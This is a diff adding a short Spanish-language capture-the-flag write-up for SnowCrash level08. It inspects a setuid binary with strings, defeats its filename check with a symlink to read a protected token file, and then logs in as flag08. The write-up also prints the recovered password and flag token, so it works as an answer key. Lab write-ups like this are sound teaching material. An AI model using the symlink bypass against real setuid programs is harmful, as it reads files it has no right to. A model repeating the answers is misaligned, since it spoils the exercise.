@@ -1,0 +1,52 @@
+level08
+
+
+
+
+	En este nivel hay dos archivos un script setuid como ya es costumbre un archivo token un tanto curioso ya que el pasarle file:
+
+	level08@SnowCrash:~$ file token 
+	token: regular file, no read permission
+
+	nos dice eso.
+	
+
+	level08@SnowCrash:~$ ls -la token 
+	-rw------- 1 flag08 flag08 26 Mar  5  2016 token
+
+	tampoco tenemos permiso de nada, curioso todo la verdad, ejecutamos el script.
+
+	y nos salta:
+
+	./level08 token 
+	You may not access 'token'
+
+	este es el ejecutable pasado por strings:
+
+	%s [file to read]
+	token
+	You may not access '%s'
+	Unable to open %s
+	Unable to read fd %d
+	;*2$"
+	GCC: (Ubuntu/Linaro 4.6.3-1ubuntu5) 4.6.3
+	level08.c
+
+	despues de mucho investigar hacemos un link simbolico sin "token" y lo leemos:
+
+	ln -s ~/token /tmp/flag; ./level08 /tmp/flag
+
+	quif5eloekouj29ke0vouxean
+
+	bingo, ahora pasamos por sudo su:
+
+	level08@SnowCrash:~$ su flag08
+	Password: 
+	Don't forget to launch getflag !
+	flag08@SnowCrash:~$ getflag
+	Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
+
+
+
+
+
